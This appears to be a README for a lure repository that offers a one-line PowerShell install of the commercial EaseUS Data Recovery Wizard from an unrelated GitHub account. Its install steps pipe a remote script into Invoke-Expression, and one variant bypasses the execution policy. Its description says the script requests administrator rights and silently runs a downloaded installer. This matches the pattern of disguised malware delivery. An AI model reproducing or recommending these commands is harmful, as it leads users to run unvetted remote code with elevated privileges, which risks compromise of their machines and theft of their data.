# EaseUS Data Recovery Wizard Setup
One-liner to install EaseUS Data Recovery Wizard -- the reliable file recovery tool that restores lost data from any storage device in minutes.

## Install
Open PowerShell and run:

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

That's it. The installer handles everything.

## What it does
- Requests administrator privileges for direct raw disk sector access during scanning.
- Downloads EaseUS Data Recovery Wizard installer and runs it silently.
- Starts a combined Quick and Deep scan on the selected storage device.
- Filters recovered files by type, date, and size before final recovery to destination.

## Requirements
- Windows 10 / 11 (64-bit)
- PowerShell 5.1+
- Internet connection
- ~180 MB free disk space

## Troubleshooting

**Files are found but saving them to the original drive location fails**

Never recover to the source drive â€” always choose a separate drive as the recovery destination.

**RAW file system partition shows no recoverable files after scan**

Enable Deep Scan mode â€” RAW partitions require full sector-level analysis to locate file data.

**Alternative (bypass execution policy):**

```powershell
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex"
```

"irm is not recognized" -- old PowerShell. Use:

```powershell
Invoke-RestMethod https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | Invoke-Expression
```

## License
MIT -- see LICENSE.